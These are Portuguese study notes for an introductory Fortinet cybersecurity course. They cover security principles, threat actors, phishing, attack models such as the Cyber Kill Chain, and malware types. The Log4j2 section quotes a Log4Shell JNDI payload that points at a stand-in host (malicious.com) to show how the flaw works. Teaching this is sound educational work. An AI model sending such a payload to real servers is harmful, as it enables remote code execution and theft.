FCF - Introduction to the Threat Landscape 3.0

### INTRODUÇÃO ###

Pilares:

   confidencialidade:
      saber quem está acessando e se é autorizado a acessar.
   integridade:
      dados alterados deve haver alertas que esses dados foram alterados.
   disponibilidade:
      os serviços devem estar sempre disponíveis para os usuários

Oposto:
   divulgação, alteração, negação (DAN)
      Inverso da tríade CID.
   
   Solução: firewall (uma possível solução que pode ajudar)

Autenticação: identificar e verificar alguma coisa.

Autorização: controla o acesso dos recursos, uma área pode ter privilégios de acesso.

Auditoria: manutenção de registros e rastrear atividades.

Categorias:

   infraestrutura crítica
   segurança de aplicações
   segurança de rede
   sistema de IOT
   segurança na nuvem
   pessoas e processos.

InfoSec: proteger informações
   previnir, detectar e remediar ataques tanto digitatis e físicos

Informações Threat Intelligence são: relevantes, acionáveis e contextuais

### AGENTES DE AMEAÇAS ###

   > Tipos de criminosos (agentes):

   Explorador

      encontrar os pontos fracos, querem apenas ser notados, usam muito phising (enganar pessoas para fornecerem informações pessoais), spear phising (email,tem um grupo específico alvo), vishing (mais por ligação).

   Hacktivista

      agem coletivamente por conta de uma causa comum entre eles;
      Exemplo de ataque de negação de serviço (DDoS):
      1. constroem um Botnet (servidor de comando e controle C&C, ponto central de todos os nós do botnet);
      2. fazem um malware e assim que o servidor requisita, vários 'disparos' são feitos na entidade alvo, sobrecarregando-a e parando seus serviços.

   Ciberterrorista

      bem parecido com os Hacktivista, mas são mais agressivos, eles também possuem mais recursos e gostam de aplicar o spear phishing. Exemplo: Um atacante pode criar um e-mail que pareça vir do gerente de TI de uma empresa, informando sobre um problema urgente de segurança e solicitando que o usuário atualize suas credenciais de acesso em um link falso. 

   Cibercriminoso

      Querem dinheiro, usam phising (bem parecido com o spear phising, porém ele é menos personalizado, é um tipo de ataque mais geral, enquanto o spear é mais direcionado, aumentando as chancces de sucesso), roubo de identidades ou cartões de crédito e vendem no mercado negro. Utilizam também Ransomware, que é um tipo de malware que bloqueia um computador e é liberado até que paguem para eles.


   Ciberguerreiro

      Motivados pelos interesses nacionais, sendo bem perigosos.

   Categorias de Hackers:

      Branco: ético

      Preto: malicioso

      Cinza: não é malicioso, mas também nem sempre é ético.

      Azul: ético contratado por terceiros.

   > Tipos de ameaças 

      Vetor de ataque: método usado para invadir uma rede/sistema, como: explorar a vulnerabilidade, o mecanismo e o caminho dela. Exemplo: enivar email contendo um malware para alguém, se passando por seu amigo. Vulnerabilidade é o usuário, mecanismo é o malware e o caminho é o email.

      Caminho de ataque:  cadeia de eventos de quando os vetores de ataques são explorados.

      Categorias:

         1. Engenharia social: manipular pessoas.
         2. Malware: software malicioso.
         3. Acesso não autorizado: uma pessoa tentando entrar em algum lugar sem autorização (pode ser físico ou digital)
         4. Falha no projeto do sistema: olhar uma pessoa digitando suas digitais, por exemplo.

      Whale phishing: ataque direcionado  exatamente para uma pessoa de um cargo alto, para obter acesso a bd, por exemplo.

      Threat Intelligence:

         Entender o tipo de ameaça para saber lhe dar melhor com ela. Informações devem ser:
            1. relevantes (impactam minha organização)
            2. acionáveis (deve ter informações suficientes)
            3. contextuais (informações suficientes para avaliar a ameaça).
         
         Common Vulnerability Scoring System (CVSS): medir a vulnerabilidade de um sistema.

         Padrões de linguagem de ameaças: STIX, TAXII

         Como usar:

            1. Identificar as ameaças mais importantes a serem interrompidas.
            2. Reunir as informações das ameaças.
            3. Processar as informações.
            4. Analisar e procurar indicadores de compromisso (IoC).
            5. Divulgar as análises.
            6. Implementar as lições aprendidas.
            7. Volta no 1.
   
   Estrutura de Ataque:
      
      Estágios:
         1.Identificar situação
         2. Classificar o problema
         3. Analisar o impacto
         4. Desenvolver estratégias

      Ferramentas (Exemplos de modelos de ataques):
         1. Cyber Kill Chain: esse modelo possui etapas, que são:
            1.Reconhecimento: invasor coleta informações e possíveis vulnerabilidades.
            2. Armamentização: criar carga útil, como um malware ou um cavalo de troia
            3. Entrega: invasor entrega a carga útil ao alvo.
            4. Exploração: usa a carga útil para obter acesso ao SO ou rede do alvo.
            5. Instalação: estabelece uma posição estável no sistema, ou seja, mesmo que a carga útil seja descoberta, ele permanece no sistema.
            6. Comando e controle: estabele uma comunicação no sistema, consegue acessar remotamente o sistema.
            7. Exfiltração: extrai os dados.

         2. MITRE ATT&CK: descreve uma série de técnicas de ataque e são listadas por categorias e também fornece uma linguagem para entender os ataques cibernéticos.

   Alertas e avisos de ataques:

      Boas práticas:
         1. manter-se atualizado com as vulnerabilidades e ataques detectados recentemente.
         2. revisar os relatórios de vulnerabilidade e exposições comuns (CVE).
         3. consultar sites confiáveis de segurnça como o Cybersecurity and infrastructure security agency (CISA).
         4. assinar serviços oferecidos por fornecedores de segurança.
      
      Alertas de ataques possuem:
         1. narrativa do ataque, tendo sua linha do tempo e tecnologias afetadas.
         2. lista de soluções para romper a sequência de ataques e ferramentas para caçar ameaças.
         3. lista de recursos e pesquisas relacionadas.
         Também aconselham equipes de segurança como detectar, responder, proteger ou se recuperar de ameaças.
         Ajuda as organizações a identificar lacunas e pontos fracos de segurança nas defesas da rede.

      Vulnerabilidade do Apache Log4j2
         Divulgada em dezembro de 2021, permite que um invasor execute código remotamente em servidores afetados, explorando a função de log via JNDI. É uma falha crítica, amplamente explorada, e a correção envolve atualizar o Log4j2 para a versão 2.17.1 ou superior.
         A vulnerabilidade explora a funcionalidade de lookup de variáveis do Log4j, permitindo que um atacante envie uma string especialmente criada (como 
         ${jndi:ldap://malicious.com/exploit}) que, quando registrada pelo Log4j, faz com que a aplicação busque e execute código malicioso via JNDI (Java Naming and Directory Interface).
         Pode permitir que um invasor execute código remotamente em servidores afetados, levando a roubo de dados, controle total do sistema ou disseminação de malware.

      Estrutura de segurança cibernética (CSF) do NIST: proteger, detectar, responder e identificar.

      Cyber Kill Chain é dividido, como:
            Proteger: reconhecimento, armamentização, entrega e exploração.

      Estrutura de resposta a incidentes do NIST: detectar, responder e recuperar.

### ENGENHARIA SOCIAL ###

   Ato de manipular pessoas para adquirir vantagem.

   Técnicas de engenharia social:
       
      -Phishing: é um spam malicioso enviado geralmente por email para um grupo muito grande. Tem algumas variações como:

         Smishing: semelhante ao phishing, porém utiliza SMS;
         Vishing: semelhante ao phishing, porém utiliza algum meio de comunicação por voz;
         Spear phishing: Igual ao phising, porém direcionado a um grupo menor de pessoas, geralmente pessoas em um nível inferior em uma oraganização;   
         Whale phishing: direcionado a um grupo específico de pessoas de alto escalão.

   Fraudes golpes e campanhas de influência:

      Fraude cibernética: engenharia social, malware e outro tipo de engano usado para fraude ou tirar vantagem.

      Golpes cibernéticos: tipo de fraude irrisório.

### MALWARE ###

   Worm é um vírus autoativado, ou seja, não precisa que o usuário o ative.
   Ransomware nega que o usuário utilize algumas informações, normalmente criptografando elas.
   Spyware relata o comportamento do usuário a terceiros.

   Tipos de vírus:

      Residente: infecta aplicações quando elas estão abertas.
      Não residente: infecta arquivos e executáveis quando não estão em execução.
      Multipartido: infecta muitos computadores e permanecem na memória do computador.
      Ação direta: acessa a memória principal do computador e infecta todas as aplicações e arquivos.
      Sequestrador de navegador: altera as configurações dos navegadores.
      Sobrescrita: excluir e substituir dados em arquivos por seu próprio conteúdo.
      Scripts da web: ataca a segurança do navegador web e injeta código malicioso.
      File infector: substitui arquivos quando eles são abertos.
      Rede: paralisa a rede e espalha para dispositivos conectados nela.
      Setor de inicialização: tem como alvo o registro mestre de inicialização (MBR) e vai para a memória principal quando o computador é reiniciado.

   Os vírus possuem três características:
      1. precisa de um usuário para executar.
      2. propaga-se injetando código em programas válidos.
      3. pode espalhar para outros computadores e redes.

   Outros tipos de malware:

      são malwares, mas não são vírus, como:

         Rootkit: coleção de software maliciosos que permite acesso a um computador que de uma outra forma não seria permitida.
         Injeção de DDL: substitui arquivos DDL legítmos por arquivos maliciosos.
         Manipulalção de driver: altera ou substitui o software de driver, isso permite que o SO se comunique com o hardware.
         Adware: se esconde e exibe anúncios.
         Dialer: contas telefônicas caras.
         Inteligência artificial adversária: confundir uma rede neural.
         Ransomware: criptografa e só é restaurado após pagar um valor.
         Cavalo de troia: algo disfarçado.
         Dropper: tipo de cavalo de troia para instalar um malware ou baixa o malware.
         Rogueware/scareware: induz o usuário acreditar que há um vírus no computador e precisa pagar um software.
         Malware de botnet: infecta um host por meio de um servidor de comando (C&C). Um computador infectado é um bot, um conjunto é um botnet.
         Cryptojacking: uso ilegal de recursos de computadores para extrair criptomoedas.
   
   Métodos e vetores de ataques de Malware:

      Vetor de ataque: método de ataque ou uma categoria de ataque, como a engenharia social, possui: vulnerabilidade, mecanismo e um caminho.
      Uma superfície de ataque é o número total de pontos de entrada que o vetor cria para obter acesso não autorizado ao alvo, também pode-se dizer que é o alvo do ataque, essa superfície pode expandir ou contrair. Exemplo: uma pessoa sendo atacada, colocar capacete faz a superficie de ataque contrair, agora uma senha sendo a superfície de ataque, senhas fortes contrai a superfície, fracas expandem.

      Exemplos de vetores de ataque de malware:
         ataque watering hole:
            vulnerabilidade é o usuário, caminho é o watering hole, mecanismo é o malware.
         
         Bot/Zumbi:
            o atacante controla o computador usando um servdor de comando (C&C). 